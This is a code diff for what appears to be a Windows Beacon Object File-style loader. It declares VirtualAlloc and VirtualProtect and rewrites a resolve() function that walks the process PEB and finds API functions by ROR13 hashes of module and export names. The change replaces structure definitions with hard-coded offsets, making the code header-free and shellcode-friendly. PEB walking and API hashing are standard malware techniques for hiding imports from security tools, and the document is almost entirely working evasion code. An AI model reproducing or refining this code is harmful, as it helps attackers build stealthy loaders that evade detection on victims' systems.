@@ -1,5 +1,4 @@
 #include <windows.h>
-#include <winternl.h>
 
 WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
 WINBASEAPI BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
@@ -44,23 +43,21 @@ cleanup:
 
 FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
 {
+    char * peb;
 #ifdef _WIN64
-    PPEB peb = (PPEB) __readgsqword ( 0x60 );
+    peb = (char *) __readgsqword ( 0x60 );
 #else
-    PPEB peb = (PPEB) __readfsdword ( 0x30 );
+    peb = (char *) __readfsdword ( 0x30 );
 #endif
 
-    PPEB_LDR_DATA ldr = peb->Ldr;
-    LIST_ENTRY * head = &ldr->InMemoryOrderModuleList;
-    LIST_ENTRY * curr = head->Flink;
+    char * ldr = *(char **) ( peb + 0x18 );
+    char * head = ldr + 0x20;
+    char * curr = *(char **) head;
 
     while ( curr != head )
     {
-        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD (
-            curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks );
-
-        WCHAR * name = entry->FullDllName.Buffer;
-        if ( !name ) { curr = curr->Flink; continue; }
+        WCHAR * name = *(WCHAR **) ( curr + 0x40 );
+        if ( !name ) { curr = *(char **) curr; continue; }
 
         WCHAR * base_name = name;
         WCHAR * p = name;
@@ -71,35 +68,46 @@ FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
         }
 
         DWORD m_hash = 0;
-        p = base_name;
-        while ( *p )
+        unsigned char * bp = (unsigned char *) base_name;
+        while ( bp[0] || bp[1] )
         {
-            WCHAR c = *p++;
-            if ( c >= 'a' && c <= 'z' ) c -= 0x20;
+            unsigned char lo = bp[0];
+            unsigned char hi = bp[1];
+            if ( hi == 0 && lo >= 'a' && lo <= 'z' )
+                lo -= 0x20;
             m_hash = ( m_hash >> 13 ) | ( m_hash << 19 );
-            m_hash += c;
+            m_hash += lo;
+            m_hash = ( m_hash >> 13 ) | ( m_hash << 19 );
+            m_hash += hi;
+            bp += 2;
         }
 
         if ( m_hash == mod_hash )
         {
-            HMODULE base = (HMODULE) entry->Reserved2[0];
-            IMAGE_DOS_HEADER * dos = (IMAGE_DOS_HEADER *) base;
-            IMAGE_NT_HEADERS * nt  = (IMAGE_NT_HEADERS *)
-                ( (BYTE *) base + dos->e_lfanew );
+            char * base = *(char **) ( curr + 0x20 );
+            DWORD e_lfanew = *(DWORD *) ( base + 0x3C );
+            char * nt = base + e_lfanew;
 
-            if ( nt->OptionalHeader.DataDirectory[0].Size == 0 )
+#ifdef _WIN64
+            DWORD export_size = *(DWORD *) ( nt + 0x18 + 0x70 + 4 );
+            DWORD export_rva  = *(DWORD *) ( nt + 0x18 + 0x70 );
+#else
+            DWORD export_size = *(DWORD *) ( nt + 0x18 + 0x60 + 4 );
+            DWORD export_rva  = *(DWORD *) ( nt + 0x18 + 0x60 );
+#endif
+            if ( export_size == 0 )
                 return NULL;
 
-            IMAGE_EXPORT_DIRECTORY * exports = (IMAGE_EXPORT_DIRECTORY *)
-                ( (BYTE *) base + nt->OptionalHeader.DataDirectory[0].VirtualAddress );
+            char * exports = base + export_rva;
 
-            DWORD * names    = (DWORD *) ( (BYTE *) base + exports->AddressOfNames );
-            WORD  * ordinals = (WORD *)  ( (BYTE *) base + exports->AddressOfNameOrdinals );
-            DWORD * funcs    = (DWORD *) ( (BYTE *) base + exports->AddressOfFunctions );
+            DWORD num_names  = *(DWORD *) ( exports + 0x18 );
+            DWORD * names    = (DWORD *) ( base + *(DWORD *) ( exports + 0x20 ) );
+            WORD  * ordinals = (WORD *)  ( base + *(DWORD *) ( exports + 0x24 ) );
+            DWORD * funcs    = (DWORD *) ( base + *(DWORD *) ( exports + 0x1C ) );
 
-            for ( DWORD i = 0; i < exports->NumberOfNames; i++ )
+            for ( DWORD i = 0; i < num_names; i++ )
             {
-                char * fn_name = (char *) ( (BYTE *) base + names[i] );
+                char * fn_name = base + names[i];
                 DWORD f_hash = 0;
                 char * fp = fn_name;
                 while ( *fp )
@@ -109,13 +117,13 @@ FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
                 }
 
                 if ( f_hash == func_hash )
-                    return (FARPROC) ( (BYTE *) base + funcs[ ordinals[i] ] );
+                    return (FARPROC) ( base + funcs[ ordinals[i] ] );
             }
 
             return NULL;
         }
 
-        curr = curr->Flink;
+        curr = *(char **) curr;
     }
 
     return NULL;
